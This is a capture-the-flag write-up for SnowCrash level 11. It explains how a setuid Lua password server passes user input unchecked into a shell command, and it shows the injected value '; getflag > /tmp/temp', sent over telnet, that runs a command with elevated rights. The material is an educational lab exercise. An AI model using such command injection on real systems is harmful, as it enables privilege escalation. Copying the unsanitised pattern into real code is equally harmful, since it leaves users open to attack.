# Security Vulnerability for Level11

The code takes any user input and injects it into a shell command without checking, making it really easy to inject something malicious.

## Finding the Password for the `level12` User

### 1. Inspect `/home/user/level11` Directory

```bash
ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
```bash
cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

> Lua is a general purpose embedded interpreted programming language designed to support procedural programming with data description facilities. Very fast and lightweight.

### 2. Inspect `.lua` File

There is a lua code. We can connect to a TCP server running on port 5151. It will ask to write a password. The code will be hashed and compared with the hash of the correct password. 

The important part is:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

> Lua denotes the string concatenation operator by ".." (two dots). If any of its operands is a number, Lua converts that number to a string.
```lua
    print("Hello " .. "World")  --> Hello World
    print(0 .. 1)               --> 01
```

We see the command echo that executes and passes the result to sha1sum after pipe.
`echo` prints the pass - the password given by user and gives it to `sha1sum` which hashes it.

The program `level11.lua` has rights `-rwsr-sr-x` which means during its execution file has rights of `flag11` user, `flag11` user can execute `getflag` command and get the password for the next level `level12`.

It gives the idea to try the command injection.

### 3. Connect to the Server

Firstly, connect to the server to see what we can do.
```bash
telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: test
Erf nope..
Connection closed by foreign host.
```
Our password was hashed and compared with the hash of the correct password. It is not the same so we receive "erf nope".
It was hashed like this:
```lua
  prog = io.popen("echo ".."test".." | sha1sum", "r")
```
The program executes shell command `echo test`. It is the key.

### 4. Inject a Command to Get the Password for `level12` user

We want inject a command so the program has:
```lua
prog = io.popen("echo ".."; getflag > our_file".." | sha1sum", "r")
```
So the shell command that will be executed by the program with `flag11` rights is:
```bash
echo ; getflag > our_file
```

Connect to a TCP server and put the injection as password:
```bash
level11@SnowCrash:~$ telnet localhost 5151
Password: ; getflag > /tmp/temp
```
Result is in `our_file`:
Check flag.Here is your token : xxxxxxx